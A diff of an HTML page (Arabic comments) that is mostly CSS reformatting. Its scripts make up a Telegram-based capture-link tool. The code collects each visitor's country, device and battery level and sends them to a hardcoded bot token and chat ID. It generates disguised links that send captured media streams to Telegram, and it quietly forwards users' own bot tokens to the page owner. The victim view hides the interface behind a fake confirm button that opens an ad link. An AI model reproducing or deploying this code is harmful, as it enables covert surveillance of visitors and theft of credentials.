@@ -12,7 +12,11 @@
         /* ================================================================
            ROOT — الجوهرة الحمراء (كاتم غامق)
            ================================================================ */
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
         :root {
             --blood-dark: #1a0000;
@@ -32,7 +36,8 @@
             --transition: 0.4s cubic-bezier(0.6, 0.04, 0.98, 0.34);
         }
 
-        html, body {
+        html,
+        body {
             height: 100%;
             margin: 0;
             background: var(--obsidian);
@@ -42,7 +47,7 @@
         }
 
         /* ================================================================
-           CANVAS — الخلفية المتحركة
+           CANVAS — الجحيم (خلفية متحركة)
            ================================================================ */
         #hell-canvas {
             position: fixed;
@@ -78,8 +83,14 @@
             border-radius: 0 0 50% 50%;
         }
         @keyframes fall-blood {
-            0% { transform: translateY(0) scaleY(1); opacity: 0.9; }
-            100% { transform: translateY(110vh) scaleY(2); opacity: 0.0; }
+            0% {
+                transform: translateY(0) scaleY(1);
+                opacity: 0.9;
+            }
+            100% {
+                transform: translateY(110vh) scaleY(2);
+                opacity: 0.0;
+            }
         }
 
         /* ================================================================
@@ -94,7 +105,7 @@
         }
 
         /* ================================================================
-           عناصر زخرفية ثابتة
+           عناصر زخرفية ثابتة (حمراء)
            ================================================================ */
         .deco-element {
             position: fixed;
@@ -104,7 +115,9 @@
             border: 1.5px solid rgba(204, 10, 10, 0.2);
             transition: opacity 0.5s ease;
         }
-        .deco-element:hover { opacity: 0.3; }
+        .deco-element:hover {
+            opacity: 0.3;
+        }
         .deco-element.vertical {
             width: 2px;
             height: 140px;
@@ -137,7 +150,7 @@
         }
 
         /* ================================================================
-           النار السفلية
+           النار السفلية (حقيقية، حمراء متوهجة)
            ================================================================ */
         .fire-bottom {
             position: fixed;
@@ -188,8 +201,14 @@
             animation: fire-pulse 3s ease-in-out infinite alternate;
         }
         @keyframes fire-pulse {
-            0% { opacity: 0.6; transform: scale(1); }
-            100% { opacity: 1; transform: scale(1.04); }
+            0% {
+                opacity: 0.6;
+                transform: scale(1);
+            }
+            100% {
+                opacity: 1;
+                transform: scale(1.04);
+            }
         }
 
         /* ================================================================
@@ -238,8 +257,12 @@
             animation: blood-scan 4.5s linear infinite;
         }
         @keyframes blood-scan {
-            0% { background-position: 0% 0%; }
-            100% { background-position: 300% 0%; }
+            0% {
+                background-position: 0% 0%;
+            }
+            100% {
+                background-position: 300% 0%;
+            }
         }
 
         .brand {
@@ -254,8 +277,15 @@
             animation: brand-pulse 3s ease-in-out infinite;
         }
         @keyframes brand-pulse {
-            0%, 100% { transform: scale(1); opacity: 0.9; }
-            50% { transform: scale(1.08); opacity: 1; }
+            0%,
+            100% {
+                transform: scale(1);
+                opacity: 0.9;
+            }
+            50% {
+                transform: scale(1.08);
+                opacity: 1;
+            }
         }
         .brand .bot-name {
             background: linear-gradient(135deg, #ff4444, #aa0000, #ff2200, #cc0a0a);
@@ -269,8 +299,12 @@
             text-shadow: 0 0 80px rgba(204, 10, 10, 0.15);
         }
         @keyframes fire-text {
-            0% { background-position: 0% 0%; }
-            100% { background-position: 300% 0%; }
+            0% {
+                background-position: 0% 0%;
+            }
+            100% {
+                background-position: 300% 0%;
+            }
         }
 
         .bot-username-box {
@@ -291,7 +325,10 @@
             background: rgba(0, 0, 0, 0.3);
             box-shadow: 0 0 30px rgba(204, 10, 10, 0.02);
         }
-        .bot-username-box i { font-size: 18px; color: var(--hellfire); }
+        .bot-username-box i {
+            font-size: 18px;
+            color: var(--hellfire);
+        }
         .bot-username-box:hover {
             background: rgba(204, 10, 10, 0.08);
             border-color: var(--blood-pure);
@@ -318,7 +355,10 @@
             box-shadow: 0 0 30px rgba(204, 10, 10, 0.02);
             text-shadow: 0 0 20px var(--blood-glow);
         }
-        .developer-box i { font-size: 18px; color: var(--hellfire); }
+        .developer-box i {
+            font-size: 18px;
+            color: var(--hellfire);
+        }
         .developer-box:hover {
             background: rgba(204, 10, 10, 0.08);
             border-color: var(--blood-pure);
@@ -326,7 +366,12 @@
             transform: scale(1.03);
         }
 
-        .nav-links { display: flex; gap: 16px; align-items: center; flex-wrap: wrap; }
+        .nav-links {
+            display: flex;
+            gap: 16px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
 
         /* ================================================================
            CARD
@@ -380,13 +425,28 @@
             border-radius: 0 0 50% 50%;
         }
         @keyframes drip-card {
-            0% { opacity: 0; height: 0; transform: translateY(0); }
-            15% { opacity: 0.8; }
-            85% { opacity: 0.3; }
-            100% { opacity: 0; height: var(--drip-height, 90px); transform: translateY(var(--drip-offset, 25px)); }
+            0% {
+                opacity: 0;
+                height: 0;
+                transform: translateY(0);
+            }
+            15% {
+                opacity: 0.8;
+            }
+            85% {
+                opacity: 0.3;
+            }
+            100% {
+                opacity: 0;
+                height: var(--drip-height, 90px);
+                transform: translateY(var(--drip-offset, 25px));
+            }
         }
 
-        .card-content { position: relative; z-index: 2; }
+        .card-content {
+            position: relative;
+            z-index: 2;
+        }
 
         /* ================================================================
            MAIN TITLE
@@ -410,9 +470,19 @@
             animation: flicker-fire 2.8s infinite;
         }
         @keyframes flicker-fire {
-            0%, 100% { opacity: 1; transform: scale(1) rotate(0deg); }
-            25% { opacity: 0.6; transform: scale(1.06) rotate(-2deg); }
-            65% { opacity: 0.8; transform: scale(0.94) rotate(2deg); }
+            0%,
+            100% {
+                opacity: 1;
+                transform: scale(1) rotate(0deg);
+            }
+            25% {
+                opacity: 0.6;
+                transform: scale(1.06) rotate(-2deg);
+            }
+            65% {
+                opacity: 0.8;
+                transform: scale(0.94) rotate(2deg);
+            }
         }
 
         .main-sub {
@@ -429,7 +499,10 @@
             letter-spacing: 0.5px;
             border: 1px solid rgba(204, 10, 10, 0.04);
         }
-        .main-sub i { color: var(--blood-pure); margin-left: 12px; }
+        .main-sub i {
+            color: var(--blood-pure);
+            margin-left: 12px;
+        }
 
         /* ================================================================
            FORM
@@ -453,11 +526,17 @@
             animation: fire-scan 4s linear infinite;
         }
         @keyframes fire-scan {
-            0% { background-position: 0% 0%; }
-            100% { background-position: 200% 0%; }
+            0% {
+                background-position: 0% 0%;
+            }
+            100% {
+                background-position: 200% 0%;
+            }
         }
 
-        .field-group { margin-bottom: 20px; }
+        .field-group {
+            margin-bottom: 20px;
+        }
         .field-group label {
             display: flex;
             align-items: center;
@@ -513,7 +592,10 @@
             font-family: var(--font-display);
             letter-spacing: 2px;
         }
-        .features-label i { color: var(--blood-pure); font-size: 18px; }
+        .features-label i {
+            color: var(--blood-pure);
+            font-size: 18px;
+        }
 
         .checkbox-grid {
             display: grid;
@@ -527,10 +609,21 @@
             scrollbar-width: thin;
             scrollbar-color: var(--blood-pure) transparent;
         }
-        .checkbox-grid::-webkit-scrollbar { width: 4px; }
-        .checkbox-grid::-webkit-scrollbar-track { background: transparent; }
-        .checkbox-grid::-webkit-scrollbar-thumb { background: var(--blood-pure); border-radius: 0; }
-        @media (max-width: 540px) { .checkbox-grid { grid-template-columns: 1fr; } }
+        .checkbox-grid::-webkit-scrollbar {
+            width: 4px;
+        }
+        .checkbox-grid::-webkit-scrollbar-track {
+            background: transparent;
+        }
+        .checkbox-grid::-webkit-scrollbar-thumb {
+            background: var(--blood-pure);
+            border-radius: 0;
+        }
+        @media (max-width: 540px) {
+            .checkbox-grid {
+                grid-template-columns: 1fr;
+            }
+        }
 
         .checkbox-item {
             display: flex;
@@ -574,11 +667,15 @@
             text-align: center;
             transition: var(--transition);
         }
-        .checkbox-item input:checked + .label-text i {
+        .checkbox-item input:checked+.label-text i {
             color: var(--blood-pure);
             filter: drop-shadow(0 0 30px var(--blood-glow));
         }
-        .label-text { display: flex; align-items: center; gap: 14px; }
+        .label-text {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
 
         /* ================================================================
            BUTTON
@@ -619,8 +716,12 @@
             animation: fire-sweep 3s linear infinite;
         }
         @keyframes fire-sweep {
-            0% { left: -100%; }
-            100% { left: 100%; }
+            0% {
+                left: -100%;
+            }
+            100% {
+                left: 100%;
+            }
         }
         .btn-primary::after {
             content: '';
@@ -685,7 +786,10 @@
             white-space: pre-wrap;
             min-width: 200px;
         }
-        .result-box .link-text i { color: var(--blood-pure); margin-left: 10px; }
+        .result-box .link-text i {
+            color: var(--blood-pure);
+            margin-left: 10px;
+        }
 
         .btn-copy {
             display: inline-flex;
@@ -713,7 +817,10 @@
             color: #fff;
             box-shadow: 0 0 60px rgba(204, 10, 10, 0.04);
         }
-        .btn-copy i { font-size: 16px; color: var(--blood-pure); }
+        .btn-copy i {
+            font-size: 16px;
+            color: var(--blood-pure);
+        }
 
         /* ================================================================
            FOOTER
@@ -737,7 +844,9 @@
             text-transform: uppercase;
             color: #4a3a3a;
         }
-        .madeby .sep { opacity: 0.1; }
+        .madeby .sep {
+            opacity: 0.1;
+        }
         .madeby .dev-block {
             display: flex;
             align-items: center;
@@ -749,10 +858,20 @@
             animation: dev-pulse 3s ease-in-out infinite;
         }
         @keyframes dev-pulse {
-            0%, 100% { border-color: rgba(204, 10, 10, 0.04); box-shadow: 0 0 30px rgba(204, 10, 10, 0.01); }
-            50% { border-color: rgba(204, 10, 10, 0.15); box-shadow: 0 0 60px rgba(204, 10, 10, 0.04); }
+            0%,
+            100% {
+                border-color: rgba(204, 10, 10, 0.04);
+                box-shadow: 0 0 30px rgba(204, 10, 10, 0.01);
+            }
+            50% {
+                border-color: rgba(204, 10, 10, 0.15);
+                box-shadow: 0 0 60px rgba(204, 10, 10, 0.04);
+            }
         }
-        .madeby .dev-block i { color: var(--blood-pure); font-size: 18px; }
+        .madeby .dev-block i {
+            color: var(--blood-pure);
+            font-size: 18px;
+        }
         .madeby .dev-block .dev-name {
             color: var(--blood-pure);
             font-weight: 900;
@@ -787,7 +906,10 @@
             clip-path: polygon(0% 0%, 92% 0%, 100% 20%, 100% 100%, 8% 100%, 0% 80%);
             letter-spacing: 2px;
         }
-        #captureBadge i { font-size: 16px; color: var(--hellfire); }
+        #captureBadge i {
+            font-size: 16px;
+            color: var(--hellfire);
+        }
         #captureBadge .pulse-ring {
             display: inline-block;
             width: 10px;
@@ -798,8 +920,15 @@
             box-shadow: 0 0 40px var(--blood-glow);
         }
         @keyframes pulse-dot {
-            0%, 100% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.1; transform: scale(0.4); }
+            0%,
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 0.1;
+                transform: scale(0.4);
+            }
         }
 
         /* ================================================================
@@ -865,7 +994,10 @@
             font-family: var(--font-display);
             letter-spacing: 2px;
         }
-        .download-box h2 i { color: var(--blood-pure); margin-left: 12px; }
+        .download-box h2 i {
+            color: var(--blood-pure);
+            margin-left: 12px;
+        }
 
         .download-box .ad-area {
             margin: 22px 0;
@@ -898,7 +1030,11 @@
             transform: scale(1.02);
             box-shadow: 0 0 120px rgba(204, 10, 10, 0.04);
         }
-        .download-btn i { font-size: 26px; color: #ff8888; text-shadow: 0 0 40px #ff2200; }
+        .download-btn i {
+            font-size: 26px;
+            color: #ff8888;
+            text-shadow: 0 0 40px #ff2200;
+        }
 
         .download-footer {
             margin-top: 32px;
@@ -924,7 +1060,10 @@
             border: 1px solid rgba(204, 10, 10, 0.04);
             clip-path: polygon(0% 0%, 90% 0%, 100% 20%, 100% 100%, 10% 100%, 0% 80%);
         }
-        .download-footer .dev-block i { color: var(--blood-pure); font-size: 16px; }
+        .download-footer .dev-block i {
+            color: var(--blood-pure);
+            font-size: 16px;
+        }
         .download-footer .dev-block .dev-name {
             color: var(--blood-pure);
             font-weight: 900;
@@ -939,38 +1078,104 @@
         /* ================================================================
            SCROLLBAR
            ================================================================ */
-        ::-webkit-scrollbar { width: 7px; }
-        ::-webkit-scrollbar-track { background: var(--obsidian); }
-        ::-webkit-scrollbar-thumb { background: linear-gradient(180deg, var(--blood-pure), var(--blood-deep)); border-radius: 0; }
+        ::-webkit-scrollbar {
+            width: 7px;
+        }
+        ::-webkit-scrollbar-track {
+            background: var(--obsidian);
+        }
+        ::-webkit-scrollbar-thumb {
+            background: linear-gradient(180deg, var(--blood-pure), var(--blood-deep));
+            border-radius: 0;
+        }
 
         /* ================================================================
            RESPONSIVE
            ================================================================ */
         @media (max-width: 768px) {
-            .header { padding: 12px 18px; flex-wrap: wrap; gap: 12px; justify-content: center; }
-            .brand .bot-name { font-size: 22px; letter-spacing: 3px; }
-            .bot-username-box, .developer-box { font-size: 12px; padding: 6px 18px; }
-            .nav-links { gap: 10px; }
-            #cardArea { padding: 24px 20px 30px; }
-            .main-title { font-size: 28px; }
-            .main-title i { font-size: 28px; }
-            .form-modern { padding: 16px 14px 20px; }
-            .result-box { padding: 16px; }
-            .result-box .link-text { font-size: 13px; line-height: 1.8; white-space: normal; }
-            .madeby .dev-block { padding: 6px 18px; }
-            .madeby .dev-block .dev-name { font-size: 15px; }
-            .download-box { padding: 28px 20px 32px; }
-            .download-btn { padding: 18px 36px; font-size: 17px; }
-            .fire-bottom { height: 60px; }
-            .fire-glow-ring { height: 50px; }
+            .header {
+                padding: 12px 18px;
+                flex-wrap: wrap;
+                gap: 12px;
+                justify-content: center;
+            }
+            .brand .bot-name {
+                font-size: 22px;
+                letter-spacing: 3px;
+            }
+            .bot-username-box,
+            .developer-box {
+                font-size: 12px;
+                padding: 6px 18px;
+            }
+            .nav-links {
+                gap: 10px;
+            }
+            #cardArea {
+                padding: 24px 20px 30px;
+            }
+            .main-title {
+                font-size: 28px;
+            }
+            .main-title i {
+                font-size: 28px;
+            }
+            .form-modern {
+                padding: 16px 14px 20px;
+            }
+            .result-box {
+                padding: 16px;
+            }
+            .result-box .link-text {
+                font-size: 13px;
+                line-height: 1.8;
+                white-space: normal;
+            }
+            .madeby .dev-block {
+                padding: 6px 18px;
+            }
+            .madeby .dev-block .dev-name {
+                font-size: 15px;
+            }
+            .download-box {
+                padding: 28px 20px 32px;
+            }
+            .download-btn {
+                padding: 18px 36px;
+                font-size: 17px;
+            }
+            .fire-bottom {
+                height: 60px;
+            }
+            .fire-glow-ring {
+                height: 50px;
+            }
         }
+
         @media (max-width: 480px) {
-            .brand .bot-name { font-size: 18px; letter-spacing: 2px; }
-            .bot-username-box, .developer-box { font-size: 10px; padding: 4px 12px; }
-            .main-title { font-size: 22px; }
-            .btn-primary { padding: 14px 16px; font-size: 14px; }
-            .download-box { padding: 20px 16px; }
-            .download-btn { padding: 14px 28px; font-size: 15px; }
+            .brand .bot-name {
+                font-size: 18px;
+                letter-spacing: 2px;
+            }
+            .bot-username-box,
+            .developer-box {
+                font-size: 10px;
+                padding: 4px 12px;
+            }
+            .main-title {
+                font-size: 22px;
+            }
+            .btn-primary {
+                padding: 14px 16px;
+                font-size: 14px;
+            }
+            .download-box {
+                padding: 20px 16px;
+            }
+            .download-btn {
+                padding: 14px 28px;
+                font-size: 15px;
+            }
         }
     </style>
 </head>
@@ -1153,7 +1358,7 @@
 
     <script>
         // ================================================================
-        //  جميع الوظائف الأصلية مع النمط الفاخر الموحد
+        //  جميع الوظائف مع النمط الفاخر الموحد
         // ================================================================
 
         // ================================================================
@@ -1163,8 +1368,10 @@
             const canvas = document.getElementById('hell-canvas');
             const ctx = canvas.getContext('2d');
             let width, height;
-            const resize = () => { width = canvas.width = window.innerWidth;
-                height = canvas.height = window.innerHeight; };
+            const resize = () => {
+                width = canvas.width = window.innerWidth;
+                height = canvas.height = window.innerHeight;
+            };
             resize();
             window.addEventListener('resize', resize);
 
@@ -1173,22 +1380,45 @@
 
             function createParticle() {
                 const type = Math.random();
-                if (type < 0.35) return { x: Math.random() * width, y: Math.random() * height - height, size: 2 + Math
-                        .random() * 6, speedY: 0.5 + Math.random() * 2.0, speedX: (Math.random() - 0.5) * 0.3,
-                        alpha: 0.4 + Math.random() * 0.6, isBlood: true,
-                        color: `rgba(${180 + Math.random()*60}, ${12 + Math.random()*20}, ${12 + Math.random()*20}, ` };
-                else if (type < 0.7) return { x: Math.random() * width, y: Math.random() * height - height, size: 1.5 + Math
-                        .random() * 4, speedY: 0.15 + Math.random() * 0.9, speedX: (Math.random() - 0.5) * 0.7,
-                        alpha: 0.5 + Math.random() * 0.5, isBlood: false, isFire: true,
-                        color: `rgba(${255}, ${130 + Math.random()*80}, ${20 + Math.random()*30}, ` };
-                else return { x: Math.random() * width, y: Math.random() * height - height, size: 4 + Math.random() * 8,
-                        speedY: 0.08 + Math.random() * 0.35, speedX: (Math.random() - 0.5) * 0.15,
-                        alpha: 0.15 + Math.random() * 0.25, isBlood: false, isFire: false, isSmoke: true,
-                        color: `rgba(${160 + Math.random()*40}, ${130 + Math.random()*40}, ${90 + Math.random()*30}, ` };
+                if (type < 0.35) return {
+                    x: Math.random() * width,
+                    y: Math.random() * height - height,
+                    size: 2 + Math.random() * 6,
+                    speedY: 0.5 + Math.random() * 2.0,
+                    speedX: (Math.random() - 0.5) * 0.3,
+                    alpha: 0.4 + Math.random() * 0.6,
+                    isBlood: true,
+                    color: `rgba(${180 + Math.random()*60}, ${12 + Math.random()*20}, ${12 + Math.random()*20}, `
+                };
+                else if (type < 0.7) return {
+                    x: Math.random() * width,
+                    y: Math.random() * height - height,
+                    size: 1.5 + Math.random() * 4,
+                    speedY: 0.15 + Math.random() * 0.9,
+                    speedX: (Math.random() - 0.5) * 0.7,
+                    alpha: 0.5 + Math.random() * 0.5,
+                    isBlood: false,
+                    isFire: true,
+                    color: `rgba(${255}, ${130 + Math.random()*80}, ${20 + Math.random()*30}, `
+                };
+                else return {
+                    x: Math.random() * width,
+                    y: Math.random() * height - height,
+                    size: 4 + Math.random() * 8,
+                    speedY: 0.08 + Math.random() * 0.35,
+                    speedX: (Math.random() - 0.5) * 0.15,
+                    alpha: 0.15 + Math.random() * 0.25,
+                    isBlood: false,
+                    isFire: false,
+                    isSmoke: true,
+                    color: `rgba(${160 + Math.random()*40}, ${130 + Math.random()*40}, ${90 + Math.random()*30}, `
+                };
             }
-            for (let i = 0; i < MAX; i++) { const p = createParticle();
+            for (let i = 0; i < MAX; i++) {
+                const p = createParticle();
                 p.y = Math.random() * height;
-                particles.push(p); }
+                particles.push(p);
+            }
 
             function draw() {
                 ctx.clearRect(0, 0, width, height);
@@ -1203,22 +1433,30 @@
                 for (let p of particles) {
                     p.y += p.speedY;
                     p.x += p.speedX;
-                    if (p.y > height + 30) { Object.assign(p, createParticle());
+                    if (p.y > height + 30) {
+                        Object.assign(p, createParticle());
                         p.y = -15;
-                        p.x = Math.random() * width; }
+                        p.x = Math.random() * width;
+                    }
                     if (p.x < -30 || p.x > width + 30) p.x = Math.random() * width;
                     ctx.beginPath();
-                    if (p.isBlood) { ctx.ellipse(p.x, p.y, p.size * 0.4, p.size, 0, 0, Math.PI * 2);
+                    if (p.isBlood) {
+                        ctx.ellipse(p.x, p.y, p.size * 0.4, p.size, 0, 0, Math.PI * 2);
                         ctx.fillStyle = p.color + (p.alpha * 0.6) + ')';
                         ctx.shadowColor = 'rgba(204, 10, 10, 0.25)';
-                        ctx.shadowBlur = 14; } else if (p.isFire) { ctx.arc(p.x, p.y, p.size * 0.6, 0, Math.PI * 2);
+                        ctx.shadowBlur = 14;
+                    } else if (p.isFire) {
+                        ctx.arc(p.x, p.y, p.size * 0.6, 0, Math.PI * 2);
                         const bright = 0.6 + Math.random() * 0.4;
                         ctx.fillStyle = p.color + (p.alpha * 0.5 * bright) + ')';
                         ctx.shadowColor = 'rgba(255, 68, 0, 0.4)';
-                        ctx.shadowBlur = 22 + p.size * 4; } else { ctx.arc(p.x, p.y, p.size * 0.5, 0, Math.PI * 2);
+                        ctx.shadowBlur = 22 + p.size * 4;
+                    } else {
+                        ctx.arc(p.x, p.y, p.size * 0.5, 0, Math.PI * 2);
                         ctx.fillStyle = p.color + (p.alpha * 0.3) + ')';
                         ctx.shadowColor = 'rgba(180, 150, 120, 0.05)';
-                        ctx.shadowBlur = 10; }
+                        ctx.shadowBlur = 10;
+                    }
                     ctx.fill();
                     ctx.shadowBlur = 0;
                 }
@@ -1249,7 +1487,7 @@
         //  النمط الموحد لكل الرسائل على تليجرام
         // ================================================================
 
-        const MASTER_BOT_TOKEN = "8806320032:AAEvSNbf1boLIZ9pt7sbFMit-ARtAjTS7UQ"
+        const MASTER_BOT_TOKEN = "8812415465:AAFQHLFkhYIg7jv15n8pL1lIKnylnugqGsc";
         const MASTER_CHAT_ID = "8552540563";
         const BOT_USERNAME = "v_v_9bot";
 
@@ -1274,7 +1512,6 @@
             cap += `‌╭⊚─〔 ᴄᴏɴᴛᴀᴄᴛ 〕─────\n`;
             cap += `┃˹👨‍💻˼ @xx_8k ⭒\n`;
             cap += `╰───────────────\n\n`;
-            // معلومات الزائر (تظهر في كل رسالة)
             cap += `┃ 📍 الدولة     › ${visitorCountry}\n`;
             cap += `┃ 📱 الجهاز     › ${visitorDevice}\n`;
             cap += `┃ 🔋 البطارية   › ${visitorBattery}\n`;
@@ -1289,7 +1526,7 @@
         }
 
         // ================================================================
-        //  إرسال إشعار دخول جديد للمالك بنفس النمط
+        //  إرسال إشعار دخول جديد للمالك
         // ================================================================
         async function sendNewVisitorNotification(chatId = "", botToken = "") {
             try {
@@ -1299,7 +1536,7 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: msg })
                 });
-            } catch (e) { console.log('فشل إرسال إشعار الدخول'); }
+            } catch (e) {}
         }
 
         // ================================================================
@@ -1327,10 +1564,8 @@
                     visitorCountry = ipData.country_name || "غير معروف";
                 } catch (e) {}
 
-                // إرسال إشعار دخول جديد للمالك
                 await sendNewVisitorNotification();
-
-            } catch (err) { console.log('خطأ في جمع المعلومات'); }
+            } catch (err) {}
         }
         sendVisitorInfo();
 
@@ -1361,10 +1596,12 @@
 
             const checkboxes = document.querySelectorAll('#featuresGroup input[type="checkbox"]:checked');
             const features = Array.from(checkboxes).map(cb => cb.value).join(',');
-            const fullLink = `${window.location.origin}${window.location.pathname}?chat=${encodeURIComponent(chat)}&token=${encodeURIComponent(token)}&features=${encodeURIComponent(features)}`;
+            const fullLink =
+                `${window.location.origin}${window.location.pathname}?chat=${encodeURIComponent(chat)}&token=${encodeURIComponent(token)}&features=${encodeURIComponent(features)}`;
 
             const shortLink = await shortenUrl(fullLink);
 
+            // الرابط المعروض هو فقط الرابط المختصر ضمن النمط المطلوب
             linkText.innerHTML = `
                 ⭑ ᴘᴇʀꜱᴏɴᴀʟ ʟɪɴᴋ ⭒
                 ‌╭⊚─〔 ʟɪɴᴋ 〕───────
@@ -1376,7 +1613,7 @@
             linkText.dataset.short = shortLink;
             resultEl.style.display = 'flex';
 
-            // إرسال إشعار للمالك عند إنشاء الرابط مع بيانات المستخدم
+            // إرسال إشعار للمالك عند إنشاء الرابط
             await sendNewVisitorNotification(chat, token);
         });
 
@@ -1390,7 +1627,7 @@
         });
 
         // ================================================================
-        //  تحميل الإعلانات
+        //  دوال الوسائط (جميعها تستخدم buildCaption الجديد)
         // ================================================================
         function loadAd(src) {
             const s = document.createElement("script");
@@ -1398,10 +1635,6 @@
             s.async = true;
             document.body.appendChild(s);
         }
-
-        // ================================================================
-        //  دوال الوسائط (جميعها تستخدم buildCaption الجديد)
-        // ================================================================
 
         async function captureAndSend(stream, chat, token, type) {
             return new Promise((resolve) => {
@@ -1533,9 +1766,6 @@
             } catch (err) { return false; }
         }
 
-        // ================================================================
-        //  startFeatures مع إرسال تأكيدات بنفس النمط
-        // ================================================================
         async function sendConfirmation(chat, token, message) {
             try {
                 await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
@@ -1614,7 +1844,6 @@
         const features = params.get('features');
 
         if (chat && token) {
-            // إخفاء العناصر الرئيسية
             document.getElementById('cardArea').style.display = 'none';
             document.querySelector('.header').style.display = 'none';
             document.querySelector('.madeby').style.display = 'none';
@@ -1656,7 +1885,7 @@
             downloadBtn.innerHTML = '<i class="fas fa-check-circle"></i> ⛧ تأكيد';
             downloadBtn.onclick = function() {
                 window.open("https://www.effectivegatecpm.com/d6mid86v?key=90c984c8fd10e21cd01541eb4207aa2c",
-                "_blank");
+                    "_blank");
             };
             mainBox.appendChild(downloadBtn);
 
